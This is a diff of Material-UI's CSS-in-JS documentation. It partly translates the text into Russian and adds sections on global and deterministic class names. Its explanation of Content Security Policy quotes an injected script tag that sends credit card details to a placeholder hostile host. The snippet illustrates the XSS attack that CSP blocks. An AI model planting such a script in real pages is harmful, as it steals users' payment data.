@@ -104,7 +104,7 @@ const useStyles = makeStyles({
 
 The CSS injected by Material-UI to style a component has the highest specificity possible as the `<link>` is injected at the bottom of the `<head>` to ensure the components always render correctly.
 
-You might, however, also want to override these styles, for example with styled-components. If you are experiencing a CSS injection order issue, JSS [provides a mechanism](https://github.com/cssinjs/jss/blob/next/docs/setup.md#specify-the-dom-insertion-point) to handle this situation. By adjusting the placement of the `insertionPoint` within your HTML head you can [control the order](https://cssinjs.org/jss-api#attach-style-sheets-in-a-specific-order) that the CSS rules are applied to your components.
+You might, however, also want to override these styles, for example with styled-components. Если у вас возникла проблема с порядком подключения CSS, JSS [предоставляет механизм](https://github.com/cssinjs/jss/blob/next/docs/setup.md#specify-the-dom-insertion-point) решающий эту проблему. By adjusting the placement of the `insertionPoint` within your HTML head you can [control the order](https://cssinjs.org/jss-api#attach-style-sheets-in-a-specific-order) that the CSS rules are applied to your components.
 
 ### HTML-комментарий
 
@@ -237,6 +237,20 @@ If you don't like this default behavior, you can change it. JSS relies on the co
 
 ## Глобальный CSS
 
+### `jss-plugin-global`
+
+The [`jss-plugin-global`](#jss-plugins) plugin is installed in the default preset, you can use it to define global class names.
+
+{{"demo": "pages/css-in-js/advanced/GlobalCss.js"}}
+
+### Hybrid
+
+You can also combine JSS generated class names with global ones.
+
+{{"demo": "pages/css-in-js/advanced/HybridGlobalCss.js"}}
+
+### Deterministic class names
+
 We provide an option to make the class names **deterministic** with the [`dangerouslyUseGlobalCSS`](/css-in-js/api/#creategenerateclassname-options-class-name-generator) option. When turned on, the class names will look like this:
 
 - development: `.AppBar-root`
@@ -269,7 +283,7 @@ Basically, CSP mitigates cross-site scripting (XSS) attacks by requiring develop
     <script>
       sendCreditCardDetails('https://hostile.example');
     </script>
-
+    
 
 This vulnerability would allow the attacker to execute anything. However, with a secure CSP header, the browser will not load this script.
 
